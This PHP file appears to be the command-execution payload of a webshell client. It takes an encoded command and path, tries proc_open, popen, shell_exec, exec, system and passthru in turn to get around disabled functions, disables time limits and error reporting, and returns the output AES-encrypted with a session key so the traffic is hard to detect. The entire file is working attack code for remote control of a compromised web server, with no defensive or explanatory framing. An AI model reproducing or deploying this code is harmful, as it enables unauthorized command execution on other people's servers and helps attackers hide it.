
function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    return ($s0 == $str) ? $s0 : iconv('gbk', 'utf-8//IGNORE', $str);
}

function can_call($f)
{
    $disab_func = @ini_get('disable_functions') ? @ini_get('disable_functions') : array();
    if (!empty($disab_func)) {
        $disab_func = preg_replace('/[, ]+/', ',', $disab_func);
        $disab_func = array_map('trim', explode(',', $disab_func));
    }
    return function_exists($f) && is_callable($f) && !in_array($f, $disab_func);
}

@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time', 0);
error_reporting(0);
$key = $_SESSION['key'];
session_write_close();

$cmd = trim(base64_decode('__CMD__'));
$path = trim(base64_decode('__PATH__'));
$data = array(
    "status" => true,
    "result" => "",
    "path" => ""
);

chdir($path);
if (substr($cmd, 0, 3) == "cd ") {
    if (!file_exists(substr($cmd, 3))) {
        $data["result"] = "No such file or directory.";
        $data["status"] = false;
    } else if (!chdir(substr($cmd, 3))) {
        $data["result"] = "Permission denied.";
        $data["status"] = false;
    }
} else {
    $cmd = $cmd . " 2>&1";
    $exec_result = "";
    @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    if (can_call('proc_open')) {
        $handle = proc_open($cmd, array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')), $pipes);
        while (!feof($pipes[1])) {
            $exec_result .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } elseif (can_call('popen')) {
        $fp = popen($cmd, 'r');
        if (is_resource($fp))
            while (!feof($fp))
                $exec_result .= fread($fp, 1024);
        @pclose($fp);
    } elseif (can_call('shell_exec')) {
        $exec_result = shell_exec($cmd);
    } elseif (can_call('exec')) {
        $exec_result = array();
        exec($cmd, $exec_result);
        $exec_result = join("\n", $exec_result) . "\n";
    } elseif (can_call('system')) {
        ob_start();
        system($cmd);
        $exec_result = ob_get_contents();
        ob_end_clean();
    } elseif (can_call('passthru')) {
        ob_start();
        passthru($cmd);
        $exec_result = ob_get_contents();
        ob_end_clean();
    } else {
        $data["result"] = "All system functions are disabled.";
        $data["status"] = false;
    }

    if ($data["status"]) {
        $data["result"] = getSafeStr($exec_result);
    }
}

$data["path"] = getcwd();
echo openssl_encrypt(base64_encode(json_encode($data)), "aes-256-ecb", $key);
